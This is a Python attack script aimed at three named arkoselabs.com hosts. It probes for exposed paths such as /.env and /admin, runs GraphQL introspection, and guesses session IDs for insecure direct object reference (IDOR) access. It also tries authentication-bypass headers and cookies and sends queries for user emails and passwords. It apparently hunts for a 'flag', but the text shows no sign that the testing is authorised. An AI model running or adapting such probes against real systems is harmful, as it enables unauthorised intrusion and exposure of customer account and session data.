#!/usr/bin/env python3
"""Arkose Labs auth bypass + IDOR testing."""
import urllib.request, urllib.error, json, re

def get(url, timeout=10, headers=None):
    h = {'User-Agent': 'Mozilla/5.0'}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, headers=h)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode('utf-8', 'replace'), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}

def post(url, data, timeout=10, headers=None):
    h = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=json.dumps(data).encode(), headers=h, method='POST')
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.getcode(), r.read().decode('utf-8', 'replace'), dict(r.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}

# ============================================
# 1. ACCOUNT MANAGEMENT PORTAL
# ============================================
print("=== ACCOUNT MANAGEMENT PORTAL ===")
AM = "https://portal-account-mgmt.arkoselabs.com"

# Check endpoints
for path in ['/', '/login', '/register', '/admin', '/api', '/flag', '/robots.txt', '/.env', '/graphql']:
    code, body, headers = get(f"{AM}{path}")
    if code != 404:
        print(f"  {path}: {code}")
        if code == 200 and len(body) > 100:
            # Check for interesting content
            if 'flag' in body.lower() or 'secret' in body.lower():
                print(f"    INTERESTING: {body[:200]}")

# Check for GraphQL
print("\n  Testing GraphQL endpoint...")
code, body, _ = post(f"{AM}/graphql", {"query": "{ __schema { types { name } } }"})
print(f"  /graphql introspection: {code}")
if code == 200:
    print(f"  Schema: {body[:500]}")

# Try introspection with different paths
for path in ['/graphql', '/api/graphql', '/v1/graphql', '/v2/graphql']:
    code, body, _ = post(f"{AM}{path}", {"query": "{ __schema { queryType { name } } }"})
    if code == 200:
        print(f"  {path}: {code} - {body[:200]}")

# ============================================
# 2. CUSTOMER SESSIONS (IDOR)
# ============================================
print("\n=== CUSTOMER SESSIONS ===")
CS = "https://customer-sessions.arkoselabs.com"

for path in ['/', '/api', '/sessions', '/health', '/flag']:
    code, body, headers = get(f"{CS}{path}")
    if code != 404:
        print(f"  {path}: {code}")
        if body:
            print(f"    Body: {body[:200]}")

# Test IDOR on session IDs
print("\n  Testing IDOR...")
for session_id in ['1', '2', '3', 'admin', 'test', 'flag']:
    code, body, _ = get(f"{CS}/api/sessions/{session_id}")
    if code != 404:
        print(f"    /api/sessions/{session_id}: {code}")
        if body:
            print(f"      Body: {body[:200]}")

# ============================================
# 3. PORTAL AUTH BYPASS
# ============================================
print("\n=== PORTAL AUTH BYPASS ===")
PORTAL = "https://portal.arkoselabs.com"

# Test /flag with different auth headers
print("  Testing /flag endpoint...")
for headers in [
    {},
    {'Authorization': 'Bearer test'},
    {'Authorization': 'Bearer admin'},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Forwarded-Host': 'localhost'},
    {'Cookie': 'session=admin'},
    {'Cookie': 'token=admin'},
]:
    code, body, _ = get(f"{PORTAL}/flag", headers=headers)
    if code != 403:
        print(f"    Headers {list(headers.keys())}: {code}")
        if body:
            print(f"      Body: {body[:200]}")

# Test /admin with different methods
print("\n  Testing /admin endpoint...")
for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']:
    try:
        req = urllib.request.Request(f"{PORTAL}/admin", method=method,
                                     headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as r:
            code = r.getcode()
            body = r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        code = e.code
        body = e.read().decode('utf-8', 'replace')
    except Exception as e:
        code = 0
        body = str(e)
    if code != 403 and code != 404:
        print(f"    {method} /admin: {code}")
        if body:
            print(f"      Body: {body[:200]}")

# ============================================
# 4. GRAPHQL INJECTION
# ============================================
print("\n=== GRAPHQL INJECTION ===")

# Try introspection on main portal
for path in ['/api', '/api/graphql', '/graphql']:
    code, body, _ = post(f"{PORTAL}{path}", {"query": "{ __schema { types { name } } }"})
    if code == 200:
        print(f"  {path}: {code}")
        print(f"    Schema: {body[:500]}")

# Try error-based SQLi via GraphQL
for query in [
    "{ flag }",
    "{ flag(id: 1) }",
    "{ user(id: 1) { email password } }",
    "{ users { id email } }",
    "{ __typename }",
]:
    code, body, _ = post(f"{PORTAL}/api", {"query": query})
    if code != 400:
        print(f"  Query: {query[:30]} -> {code}")
        if body:
            print(f"    Response: {body[:200]}")

print("\n=== DONE ===")
